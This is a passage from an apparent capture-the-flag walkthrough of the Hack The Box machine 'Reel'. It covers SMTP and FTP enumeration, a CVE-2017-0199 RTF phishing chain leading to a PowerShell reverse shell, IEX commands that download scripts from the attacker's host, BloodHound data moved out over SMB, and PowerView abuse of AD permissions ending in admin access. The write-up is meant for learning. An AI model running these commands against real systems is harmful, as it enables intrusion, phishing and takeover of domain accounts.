<p>nc -nv 10.10.10.77 22</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bea108901196c0a0c66e2f38de141a758eabe54b.png" alt="grafik" data-base62-sha1="rcnJnDSOsP0ZTNQx93QYzqXdNEf" width="582" height="82"></p>
<p>Ok. Not much interesting here. Let’s take a look inside SMTP.<br>
There exist a few interesting tools we could use, but my favourites are <strong>smtp-user-enum.py</strong> and <strong>ismtp</strong>.</p>
<p>But first, we should take a look which commands are allowed on this SMTP server:</p>
<blockquote>
<p>telnet 10.10.10.77 25</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e74f96456acb7979f7974fb2aa4c33fb73381c08.png" alt="grafik" data-base62-sha1="x0gOdKj0d9H7HUuT4xAXpXtF3gQ" width="403" height="317"></p>
<p>Now we know that the <strong>VRFY</strong> command is disallowed and it looks like we won’t be able to enumerate some users successfully. The reason for this is the reply for the <strong>RCPT TO</strong> command I typed before.<br>
If a username that doesn’t exist will be entered (<strong>idontexist</strong>) and the server replies with a <strong>250</strong> instead of <strong>550</strong> response code it seems to be well configured to prevent user enumeration.</p>
<p>A good reference for <strong>SMTP commands</strong> you can find <a href="http://www.samlogic.net/articles/smtp-commands-reference.htm" rel="noopener nofollow ugc">here</a>.<br>
Thanks <strong>Mika Larramo</strong> for this!</p>
<p>So even if we use our tools we won’t give any useful result:</p>
<p><strong>ismtp</strong></p>
<blockquote>
<p>ismtp -h 10.10.10.77 -e /usr/share/seclists/Usernames/top-usernames-shortlist.txt -l 3</p>
</blockquote>
<p><strong>smtp-user-enum.py</strong></p>
<blockquote>
<p>smtp-user-enum -u administrator -t 10.10.10.77 -M VRFY</p>
</blockquote>
<h2>2. FTP</h2>
<p>Next step.<br>
As you noticed - Anonymous login is enabled for the FTP service. Let us use it to enumerate the machine a little bit more.</p>
<p>Credentials used:<br>
<code>anonymous:anon</code></p>
<blockquote>
<p>ftp 10.10.10.77</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1becc45b7b0024737f6dca0603a32a3f111d5771.png" alt="grafik" data-base62-sha1="3Z2a5r7Amz5R8u0lUMolV4l6RSF" width="681" height="432"></p>
<p>Here we discovered some interesting files. There exist a few methods you can download them.<br>
Because we already logged in I will use:</p>
<blockquote>
<p>ftp&gt; mget *.*</p>
</blockquote>
<p>Otherwise, you can download all these files with wget:</p>
<blockquote>
<p>wget -m --no-passive-ftp <a href="https://0x00sec.org">ftp://anonymous:anon@10.10.10.77</a></p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4d11c5b63e49a083369c3ea788c0bfda445853d8.png" alt="grafik" data-base62-sha1="aZMQdwpqNzQB2Y1citOVdZxgeko" width="676" height="116"></p>
<p>Alright, let’s analyse the files.</p>
<p><strong>AppLocker.docx</strong><br>
For this file, I used LibreOffice Writer to take a look at how it does look.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2347d9ec3442cea986efd292c62dae1f46398ea2.png" alt="grafik" data-base62-sha1="526EqBdwlEuPGbUAcUFsK4gEtTs" width="690" height="353"></p>
<p>Interesting. It gives us a little bit of information about the procedure. Let us look a little bit deeper:</p>
<blockquote>
<p>exiftool AppLocker.docx<br>
strings AppLocker.docx</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2dbf4ad1b9eec1c39cf9848cd37404a4601b2af2.png" alt="grafik" data-base62-sha1="6wHkkEkRm6l9y8dYbnDSbsdX0Ea" width="537" height="499"></p>
<p>Ok. Nothing interesting here.</p>
<p><strong>readme.txt</strong></p>
<blockquote>
<p>cat readme.txt</p>
</blockquote>
<p>Output:</p>
<blockquote>
<p>please email me any rtf format procedures - I’ll review and convert. new format / converted documents will be saved here.</p>
</blockquote>
<p>That looks interesting. What do we see here?</p>
<ul>
<li><code>"email me"</code></li>
<li><code>rtf format</code></li>
<li><code>"I will review and convert"</code></li>
<li><code>converted documents will be saved here</code></li>
</ul>
<p>Ok. What do we need?<br>
Do we have an email address? No.<br>
RTF format file?</p>
<p>From here you’re starting to think about <code>how should I found out a valid email address if SMTP doesn't return in/valid usernames?</code></p>
<p>Stop.<br>
You have to still organised. Follow your methodology even if you don’t have one yet. Your goal is to get an overview of your target. Before you start to go deeper enumeration finish your process you started.<br>
What did we do?<br>
Did we extract all information from all files? - I don’t think so.</p>
<p><strong>’Windows Event Forwarding.docx’</strong><br>
Also here I tried to open this document to take a look at it but…</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/ff530638cf28e94fc24c5a090011925028966f08.png" alt="grafik" data-base62-sha1="AqHDi0jkBmDKJmO1RgzeO0RxEj6" width="690" height="466"></p>
<p>Now it could be dangerous to start the repair process because LibreOffice might overwrite some data inside it which could be relevant for us. Additionally, it could fail too.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7f91f74da6d24bf4b28e6c3a37f1045310f229fe.png" alt="grafik" data-base62-sha1="icxmUrdbtIIYB626YFbriIBVEdM" width="499" height="152"></p>
<blockquote>
<p>exiftool Windows\ Event\ Forwarding.docx</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/826831bf534ddaea3a82c5fb3eb3adb06fd85d24.png" alt="grafik" data-base62-sha1="iBDj04K8BFJAimQXmxSwnEhoJi4" width="614" height="500"></p>
<p>It becomes interesting.<br>
In this document was stored the email address of the creator.</p>
<blockquote>
<p><a href="mailto:nico@megabank.com">nico@megabank.com</a></p>
</blockquote>
<p>I marked all information which should be noted for later enumeration. You should write it down because you won’t know which data will be required to root this box later.</p>
<h2>3. Exploitation Research</h2>
<p>Back to our questions:<br>
Do we have an email address? <strong>Yes</strong>.<br>
RTF format file?<br>
If there is a file extension, you don’t know then google for it.</p>
<blockquote>
<p>Google: rtf file</p>
</blockquote>
<p>This search will lead you to <a href="https://fileinfo.com/extension/rtf" rel="noopener nofollow ugc">https://fileinfo.com/extension/rtf</a>.</p>
<blockquote>
<p>An RTF file is a common text file format that supports “rich text.” It includes several types of text formatting, such as bold type, italics, different fonts and font sizes, and custom tab settings. RTF files also support objects and images, such as .JPG and .PNG files, saved within the text file.</p>
</blockquote>
<p>Beneficial information for us. Now let’s search for exploits.</p>
<blockquote>
<p>Google: rtf exploit</p>
</blockquote>
<p>The first result will show you an exploit toolkit from bhdresh</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/bhdresh/CVE-2017-0199" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e092731d83213375f887ed36a6ab26862a0b6951.png" class="thumbnail" width="" height="">

<h3><a href="https://github.com/bhdresh/CVE-2017-0199" target="_blank" rel="noopener nofollow ugc">bhdresh/CVE-2017-0199</a></h3>

<p>Exploit toolkit CVE-2017-0199 - v4.0 is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft Office RCE. It could generate a maliciou...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>with a full description of the exploit and usage. We will use his script to generate our malicious RTF file.</p>
<p>Here you should read a little bit more about this vulnerability.<br>
This is important. Not for me. It’s crucial for <strong>you</strong>.<br>
You should understand the attack structure and how it will look like.</p>
<p>I will come back to the attack structure later.</p>
<h2>4. RTF file creation</h2>
<p>Let us create our RTF file.</p>
<blockquote>
<p>python cve-2017-0199_toolkit.py -M gen -w sha.rtf -t RTF -u http://&lt;attacker&gt;/sha.hta</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c338f5659f812e748d23cd3ffba8bf03adb2c15c.png" alt="grafik" data-base62-sha1="rR18FUMd8D8jGNdh0A7RbtZmxl2" width="690" height="70"></p>
<p>Here you can notice that we need another file with a .hta extension?<br>
And again, what is HTA?</p>
<p>Definition from <a href="https://fileinfo.com/extension/hta" rel="noopener nofollow ugc">https://fileinfo.com/extension/hta</a> :</p>
<blockquote>
<p>Program that can be run from an HTML document; an executable file that contains hypertext code and may also contain VBScript or JScript code; can be created by simply changing the file extension of an .HTM file to an “.HTA” extension; run by the Microsoft HTML Application Host (Mshta.exe).</p>
</blockquote>
<p>And again. Crucial information we can use.</p>
<h2>5. HTA file creation</h2>
<p>There exist multiple methods to create a malicious HTA file.<br>
We could use <strong>unicorn.py</strong> or <strong>Metasploit</strong>, but I will use a PowerShell script from <strong>Nishang</strong>.</p>
<p>Therefore you will need to install PowerShell on Kali, or you execute it on your Windows machine. I will use <strong>pwsh</strong> on Kali here.</p>
<blockquote>
<p>cd /usr/share/nishang/Client/OUT-HTA.ps1<br>
pwsh</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/69f79ac87f359aa224c8ab61b7421c1ee435f634.png" alt="grafik" data-base62-sha1="f7qCJVVCusjUHeZ1yqx2ijRlPj6" width="558" height="416"></p>
<p>And this point there exists a little bug. But I think you will be able to solve it on your own. <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/db59ddf68cc18aded3439fd2b59afda7fed76286.png" alt="grafik" data-base62-sha1="vit6wHk2vpRqeG7X4CI0SxeBpt4" width="690" height="79"></p>
<p>Do you understand what we’re doing right now? Why did we create an RTF file and HTA file? And why we will create a PS1 file in the next step?<br>
At this point, when you feel like you lost the overview, then you should take a step back and return to the point where you understood the full structure of your target.</p>
<p>Now we will create our PS1 reverse shell.<br>
How will the attack look like?</p>
<p>First, we should exactly know what we have:</p>
<ol>
<li>RTF file with a redirection to our HTA file.<br>
Send Email w/ RTF -&gt; HTA</li>
<li>HTA file with a redirection to our PS1 file (Reverse Shell)<br>
Send Email w/ RTF -&gt; HTA -&gt; PS1</li>
</ol>
<p><strong>PS1 Reverse Shell</strong><br>
Also here I will use a script from <strong>Nishang</strong>.<br>
It’s stored by default in <code>/usr/share/nishang/Shells/</code> directory.</p>
<blockquote>
<p>cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 /var/www/html/sha.ps1</p>
</blockquote>
<p>Now we have to edit out reverse shell to make it executable.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9d052d1f6db82ff1f582d6c8b2f12ec61e03f0d7.png" alt="grafik" data-base62-sha1="mp43hx1zFKpP1M3dcCWcE72AINF" width="690" height="245"></p>
<p>Copy the marked PS line at the end of the script and edit it. It should look something like this:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/fc41d6d31cd2255506a258e55aeadf2d177d63ad.png" alt="grafik" data-base62-sha1="zZznHySPDunOonalxJcocd3PKFf" width="690" height="279"></p>
<h2>6. Exploitation</h2>
<p>Now let us send the email and hope that he will open it.<br>
But before we send the email, we should turn on our Web server and our listener.</p>
<p>Make sure you run the web server and the <strong>sendemail</strong> SMTP client from the directory where the files we created are stored.</p>
<p><strong>Web server</strong><br>
For the web server, you can use Python2 or Python3, ,but I will use Apache.</p>
<p>For Python2:</p>
<blockquote>
<p>python -m SimpleHTTPServer &lt;Port&gt;</p>
</blockquote>
<p>For Python3:</p>
<blockquote>
<p>python3 -m http.server &lt;Port&gt;</p>
</blockquote>
<p>Apache:<br>
service apache2 start</p>
<p><strong>Reverse Shell Listener</strong>:</p>
<blockquote>
<p>nc -nlvp 2202</p>
</blockquote>
<p>Now the exploit:</p>
<blockquote>
<p>sendemail -f <a href="mailto:shelly@megabank.com">shelly@megabank.com</a> -t <a href="mailto:nico@megabank.com">nico@megabank.com</a> -u Update -m “Please update RTF file.” -a sha.rtf -s 10.10.10.77</p>
</blockquote>
<p>It could take a moment before you get a reverse shell back.<br>
Additionally, you can run <strong>tcpdump</strong> or <strong>WireShark</strong> to capture the traffic and make sure that everything looks like we want.</p>
<p>Then it should look like the following:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/23ad88bb58d798779c6413391b9b1c4a29373d7f.png" alt="grafik" data-base62-sha1="55CvphVM3QKVhB2UkpJCCpFXh8P" width="690" height="263"></p>
<h2>7. Local Enumeration</h2>
<p>Great! We’ve got a reverse shell. Let us do some basic enumeration stuff.</p>
<blockquote>
<p>whoami<br>
net users<br>
net groups</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f4212e53b0f2f029fb400b1d7a0b6616d5c8a56b.png" alt="grafik" data-base62-sha1="yPFAKfOhkoWhYcSmcfslnDDpO6D" width="400" height="500"></p>
<blockquote>
<p>systeminfo</p>
</blockquote>
<p>Systeminfo gives us a lot of information like:<br>
OS: <strong>Microsoft Windows Server 2012 R2 Standard</strong><br>
OS Version: <strong>6.3.9600 N/A Build 9600</strong><br>
OS Configuration: <strong>Primary Domain Controller</strong><br>
System Type: <strong>x64-based PC</strong><br>
Hotfix(s): <strong>95 Hotfix(s) Installed.</strong></p>
<ul>
<li>[1]: KB2894852</li>
<li>…</li>
<li>[95]: KB4054519</li>
</ul>
<p>This hotfix(s) means that the server last update is from 12. Dec 2017. So it’s possible to find some local privilege exploits. We add this step to our To-Do-List.</p>
<p>It’s always interesting what the user we’ve access to has in his home directory.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e854361b5d94b2be39fd8da2b9dd45834e131bc3.png" alt="grafik" data-base62-sha1="x9hc67oMSH8FTz5NWMQFQuyjBkf" width="517" height="374"></p>
<p>Ok. No different directories here. Let’s look at his desktop.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9d1362f75332534fd35760291f479a1d8464c8c6.png" alt="grafik" data-base62-sha1="mpyuTXSZFYcetqmwRr2dHMz1rwO" width="496" height="208"></p>
<p>And here we found our <strong>user.txt</strong>.</p>
<blockquote>
<p>type user.txt</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4d985f51b3c8e99d803339af16cb7edec3ebb14b.png" alt="grafik" data-base62-sha1="b4rdJhITLR9k0gDmG1DRciV7WZ5" width="367" height="43"></p>
<p>But the <strong>creds.xml</strong> looks very interesting.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7f0094a50be409159f7dd617c2ab2ff6bba6bbeb.png" alt="grafik" data-base62-sha1="i7vSJmL7d0j7Gv9t8vosUxKTmDp" width="690" height="176"></p>
<p>What do we have here?</p>
<ol>
<li>XML file</li>
<li>Objs Version 1.1.0.1</li>
<li>PSCredential</li>
<li>Username: Tom</li>
<li>Password: &lt;hash&gt;</li>
</ol>
<h2>8. Extract Password from an XML file</h2>
<p>The main question here is:</p>
<blockquote>
<p>how can we extract the password from this file?</p>
</blockquote>
<p>Ask Google:</p>
<blockquote>
<p>Google: extract password from pscredential xml</p>
</blockquote>
<p>On the first page you will find this post:<br>
</p><aside class="onebox stackexchange">
  <header class="source">
      <a href="https://stackoverflow.com/questions/40029235/save-pscredential-in-the-file" target="_blank" rel="noopener nofollow ugc">stackoverflow.com</a>
  </header>
  <article class="onebox-body">
      <a href="https://stackoverflow.com/users/240564/alexan" target="_blank" rel="noopener nofollow ugc">
    <img alt="Alexan" src="https://0x00sec.s3.amazonaws.com/original/2X/8/80cc86bc6aa0419737e9f99cf4e6bda9ddd9c0ba.png" class="thumbnail onebox-avatar" width="" height="">
  </a>
<h4>
  <a href="https://stackoverflow.com/questions/40029235/save-pscredential-in-the-file" target="_blank" rel="noopener nofollow ugc">save PSCredential in the file</a>
</h4>

<div class="tags">
  <strong>powershell, credentials</strong>
</div>

<div class="date">
  asked by
  
  <a href="https://stackoverflow.com/users/240564/alexan" target="_blank" rel="noopener nofollow ugc">
    Alexan
  </a>
  on <a href="https://stackoverflow.com/questions/40029235/save-pscredential-in-the-file" target="_blank" rel="noopener nofollow ugc">07:19PM - 13 Oct 16 UTC</a>
</div>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<p></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4b91e1e470d67f1600c12dcba51c7e69c2bf54c9.png" alt="grafik" data-base62-sha1="aMwmr12ImBv0tUkEWsnmiwf9vcZ" width="517" height="198"></p>
<blockquote>
<p>PS C:\Users\nico\Desktop&gt; $credential = import-clixml -path cred.xml</p>
</blockquote>
<p>Now we are using this XML file but how to extract the encrypted password?</p>
<blockquote>
<p>Google: decrypt password from pscredential</p>
</blockquote>
<aside class="onebox stackexchange">
  <header class="source">
      <a href="https://stackoverflow.com/questions/7433178/powershell-get-credential-decode-password" target="_blank" rel="noopener nofollow ugc">stackoverflow.com</a>
  </header>
  <article class="onebox-body">
      <a href="https://stackoverflow.com/users/472123/laphi" target="_blank" rel="noopener nofollow ugc">
    <img alt="LaPhi" src="https://0x00sec.s3.amazonaws.com/original/2X/2/2fc40473ca1662ca7a24b537938b0d8b50881e5f.png" class="thumbnail onebox-avatar" width="" height="">
  </a>
<h4>
  <a href="https://stackoverflow.com/questions/7433178/powershell-get-credential-decode-password" target="_blank" rel="noopener nofollow ugc">PowerShell - Get-Credential decode password?</a>
</h4>

<div class="tags">
  <strong>powershell, credentials, system.security</strong>
</div>

<div class="date">
  asked by
  
  <a href="https://stackoverflow.com/users/472123/laphi" target="_blank" rel="noopener nofollow ugc">
    LaPhi
  </a>
  on <a href="https://stackoverflow.com/questions/7433178/powershell-get-credential-decode-password" target="_blank" rel="noopener nofollow ugc">03:11PM - 15 Sep 11 UTC</a>
</div>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/26b92b8999538adcc2a4c953fb73d938109c4479.png" alt="grafik" data-base62-sha1="5wyRS7GkIr2fZuDtJ753lKlbGIN" width="517" height="169"></p>
<p>Ok. Let us give a try, but I will change the command for a better output:</p>
<blockquote>
<p>PS C:\Users\nico\Desktop&gt; $credential.GetNetworkCredential() | fl</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4e5f0739483a2604dc513936202593364768bbcd.png" alt="grafik" data-base62-sha1="bbiQ3R2WrWQ8yEblRMjWXpPUNB3" width="627" height="159"></p>
<p>Great! We’ve got the decrypted password for the user Tom.</p>
<h2>9. SSH Login</h2>
<p>Now lets got to SSH, and we will use the credentials to log in.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2478a30404d20d8cbbefefaa5f9086df8a50fd14.png" alt="grafik" data-base62-sha1="5cDEqsGGEiHEM9T0sM5wZm75MLG" width="485" height="140"></p>
<p>I want to take a look at the home directory of the user <strong>Tom</strong>.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/952cdfe4ad7540b119f4302aa66aa8575832c812.png" alt="grafik" data-base62-sha1="lhFhL6wB1l4nGhy9ZhuXvz4LWLw" width="469" height="480"></p>
<p>What is inside the <strong>note.txt</strong>?</p>
<blockquote>
<p>type note.txt</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5f8478987602c5bad9820f90f087997b2bdab2f1.png" alt="grafik" data-base62-sha1="dCZb0WvcapuE3r9bxDZrCbKkQpP" width="690" height="89"></p>
<p>It seems they didn’t run the Cypher query against other groups. So maybe there exist a way to escalate our privileges by using another path.<br>
If you don’t know what BloodHound is or you never worked with it, I highly recommend you to search for tutorials and to try it out.</p>
<h2>10. Enumeration with BloodHound</h2>
<p>So we want to use BloodHound. I will copy <strong>SharpHound.ps1</strong> to my Web servers directory. Then we will be able to download it to the ‘Reel’ machine by using <strong>Tom</strong> and store the script into memory.</p>
<blockquote>
<p>cp /opt/BloodHound/Ingestors/SharpHound.ps1 /var/www/html/</p>
</blockquote>
<p>Before we run it, we should take a look at it.<br>
This script has a function called <strong>Invoke-BloodHound</strong> with a <strong>-CollectionMethod</strong> parameter.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/02a4b28e40009ea53a3032806763f2ce9ab3783a.png" alt="grafik" data-base62-sha1="nnOH7T3SopLtOFqtsuLTlWrZZo" width="690" height="456"></p>
<p>Let’s start PowerShell and download the script:</p>
<blockquote>
<p>tom@REEL C:\Users\tom\Desktop\AD Audit&gt;powershell</p>
</blockquote>
<blockquote>
<p>PS C:\Users\tom\Desktop\AD Audit&gt; IEX(New-Object Net.WebClient).downloadString(‘<a href="http://10.10.14.10/SharpHound.ps1" rel="noopener nofollow ugc">http://10.10.14.10/SharpHound.ps1</a>’)</p>
</blockquote>
<blockquote>
<p>PS C:\Users\tom\Desktop\AD Audit&gt; Invoke-BloodHound -CollectionMethod All</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7156a27ff3ed910759fa63427df1caffe50d1744.png" alt="grafik" data-base62-sha1="gaDzev3XOBgCIjKrwhixcyHFK7O" width="690" height="441"></p>
<p>Now we want to download this ZIP file and import it to BloodHound.</p>
<h2>11. SMB File Transfer</h2>
<p>I will use smbserver for the file transfer.</p>
<blockquote>
<p>impacket-smbserver SHELLAFFECT ./</p>
</blockquote>
<blockquote>
<p>net view \10.10.14.10</p>
</blockquote>
<blockquote>
<p>cp .\20190411050731_BloodHound.zip \\10.10.14.10\SHELLAFFECT\</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cad2c19bcdf763861cd27872bb2529e9fa124f75.png" alt="grafik" data-base62-sha1="sWfZwlw0GoWI6c7dM3BdrHERkmp" width="690" height="270"></p>
<h2>12. BloodHound AD-Relationships</h2>
<p>Because BloodHound is a JavaScript Application and is working Neo4j database with we have to start the <strong>neo4j</strong> database first.</p>
<blockquote>
<p>neo4j start</p>
</blockquote>
<p>It’s possible that a warning with failure will appear where the <strong>neo4j</strong> will say that:</p>
<blockquote>
<p>WARNING: Max 1024 open files allowed, minimum of 40000 recommended. See the Neo4j manual.<br>
/usr/share/neo4j/bin/neo4j line 451 /var/run/neo4j/neo4j.pid no such file or directory</p>
</blockquote>
<p>Just ignore that. It still working.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a7c0c200a497c36fb726ec64bc9261d7f454c9b1.png" alt="grafik" data-base62-sha1="nW0IAY3ii4h6Fxqb1ayic9Brgxr" width="589" height="500"></p>
<p>Here we can import the ZIP file just by drag &amp; drop.</p>
<p>By selecting <strong>Queries</strong> -&gt; <strong>Shortest Path to High Value Targets</strong> you’ll see a graph like this:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4979eb30f618b6823a9f9be4eaf247e0b3742313.png" alt="grafik" data-base62-sha1="au041OaxsR2B1O8UM6jU613zHRp" width="690" height="355"></p>
<p>Did you remember/note what we discovered before as user <strong>nico</strong> ?<br>
Then make a step back and retake a look.<br>
What could be relevant to us?</p>
<p>I will show you what I mean:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/54096bd4720b31143d69fd15892b473c155fd9f8.png" alt="grafik" data-base62-sha1="bZqi7RsPrcRWPq6HVQ2RCQyVHHa" width="365" height="493"></p>
<p>That’s the reason why you should always take notes. Taking notes is also an essential skill. It will make many things easier to find and will help you to create a great report at the end of a pentest. It’s a skill that should always be practised.<br>
Also, it helps you keep an overview of your target.</p>
<p>When you click on the <strong>Pathfinding</strong> icon, we can search for paths.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/edb9ca8c53766d43430a80c16e09bab88ca8be39.png" alt="grafik" data-base62-sha1="xV1dpvOtwfaGTNpvo10MpzpAUkN" width="690" height="309"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/877a902d5cfeb8d13d7cc7f82ac967d44f84e99b.png" alt="grafik" data-base62-sha1="jkv327uCAjQ688jGgUL6okHpCHN" width="690" height="309"></p>
<p>Now again, what do you see here?<br>
Which information can we use? Make notes. Write down all your ideas. Experiment. Try it out.</p>
<h2>13. Privilege Escalation using PowerView</h2>
<p>What do we see here?</p>
<ol>
<li>User: Tom</li>
<li>User: Claire</li>
<li>Group: Backup_Admins</li>
</ol>
<p>Is it everything?<br>
But there is a little bit more.</p>
<ol start="4">
<li><strong>WriteOwner</strong></li>
<li><strong>GenericWrite</strong></li>
<li><strong>WriteDacl</strong></li>
</ol>
<p>But what is it? If you never heard about it, search for it.</p>
<blockquote>
<p>Google: writeowner active directory</p>
</blockquote>
<p>The first result will give the information you need.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c7ecd6602b59f914ce9634628483c81ef0fda9f7.png" alt="grafik" data-base62-sha1="swCrbhzCW5iW5ydrQ0E6QKTx7tJ" width="467" height="248"><br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="https://adsecurity.org/?tag=writeowner" target="_blank" rel="noopener nofollow ugc">adsecurity.org</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://adsecurity.org/?tag=writeowner" target="_blank" rel="noopener nofollow ugc">WriteOwner – Active Directory Security</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<p></p>
<p>Here is the summary:</p>
<p><strong>WriteOwner</strong> : Provides the ability to take ownership of an object. The owner of an object can gain full control rights on the object.</p>
<p><strong>GenericWrite</strong> : Provides write access to all properties.</p>
<p><strong>WriteDacl</strong> : Provides the ability to modify security on an object which can lead to Full Control of the object.</p>
<p>I highly recommend reading these articles. They’re well written and very educational. When you read it, you should notice that they used a PowerShell script called <strong>PowerView</strong>.</p>
<p>We will use it too, and we copy it to our Web server directory.</p>
<p><strong>[!] Important Note</strong>: Your PowerView.ps1 might be outdated. To download the newest one visit <a href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/powerview.ps1" rel="noopener nofollow ugc">Empire@Github</a>.</p>
<p>After that, we can download it on the target machine.</p>
<blockquote>
<p>PS C:\Users\tom\Desktop&gt; IEX(New-Object Net.WebClient).downloadString(‘<a href="http://10.10.14.10/PowerView.ps1" rel="noopener nofollow ugc">http://10.10.14.10/PowerView.ps1</a>’)</p>
</blockquote>
<p>Now we will modify the owner for a specified AD object from <strong>Claire</strong> to <strong>Tom</strong>:</p>
<blockquote>
<p>PS C:\Users\tom\Desktop&gt; Set-DomainObjectOwner -Identity claire -OwnerIdentity tom</p>
</blockquote>
<p>After that, we will add an ACL for a specific AD object for the domain principal.</p>
<blockquote>
<p>Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword -Verbose</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d0fbbb61e6570e6ea2938be2d87a2b121d303edb.png" alt="grafik" data-base62-sha1="tOKE7r3NxxAwRnSEbbAwKUlv8bV" width="690" height="158"></p>
<p>Now we set the rights to reset the password for the user <strong>Claire</strong> who provides write access to all properties and the ability to modify security on an object which can lead Full Control of the object.</p>
<p>Let’s change the password. PowerView provides you with a function called <strong>Set-DomainUserPassword</strong> which we will use.<br>
But first, we have to define our new password for the user <strong>Claire</strong>:</p>
<blockquote>
<p>PS C:\Users\tom&gt; $ClairePassword = ConvertTo-SecureString ‘Ultr4Pass!’ -AsPlainText -Force -Verbose</p>
</blockquote>
<blockquote>
<p>PS C:\Users\tom&gt; Set-DomainUserPassword -Identity claire -AccountPassword $ClairePassword -Verbose</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/75693cf96f2203c0e2f8bccf1faf6d63eec260ca.png" alt="grafik" data-base62-sha1="gKFkOPSoftQZttS1bXjzmV7zCgq" width="690" height="70"></p>
<p>Also, we should add the user <strong>Claire</strong> to the domain group ‘Backup_Admins’ by using the <strong>Add-DomainGroupMember</strong> function:</p>
<blockquote>
<p>$Cred = New-Object System.Management.Automation.PSCredential(‘HTB\claire’, $ClairePassword)</p>
</blockquote>
<blockquote>
<p>Add-DomainGroupMember -Identity ‘Backup_Admins’ -Members ‘claire’ -Credential $Cred</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8dc3b48771a20f1d63e1c3fbcdb13784de805064.png" alt="grafik" data-base62-sha1="ke6CqpcPXp1eGU2btyquY37VqIc" width="690" height="40"></p>
<p>And now we can use our new credentials to log in through SSH with the user <strong>Claire</strong>:</p>
<blockquote>
<p>ssh <a href="mailto:claire@10.10.10.77">claire@10.10.10.77</a></p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f7baa9828bc6101cb98e436c3f0f3552c3fdf975.png" alt="grafik" data-base62-sha1="zlvR8lfUwRvbisJXUcA3QOwlcfb" width="648" height="498"></p>
<p>As always I enumerate the home directory of the user first. Then I try to take a look at the directories of other users. Previously we successfully added <strong>Claire</strong> to the domain group <strong>Backup_Admins</strong>. So we should be able to take a look at the home directory of the Administrator. There is an interesting folder called <strong>Backup Scripts</strong>. This directory has some PowerShell scripts which may reveal some useful information:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9c5bdb6b847dd37b3051d4735b06b271f2db935e.png" alt="grafik" data-base62-sha1="mjdhSniltYEdlnyMIYAvD27O3Lg" width="690" height="399"></p>
<p>We found admin credentials in this script. Now we can try to login by using them and read the <strong>root.txt</strong>.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/96ef465f993a2221e8a1708b57e3700cfa2b5a95.png" alt="grafik" data-base62-sha1="lxegpnQu4nEI1zgStXvX1Itl6W9" width="625" height="500"></p>
<p>By the way, there is another way to get the information you need.<br>
If you right-click at <strong>WriteOwner</strong> on the path from user <strong>Tom</strong> to <strong>Claire</strong> you will open a windows with a <strong>Help</strong> page.<br>
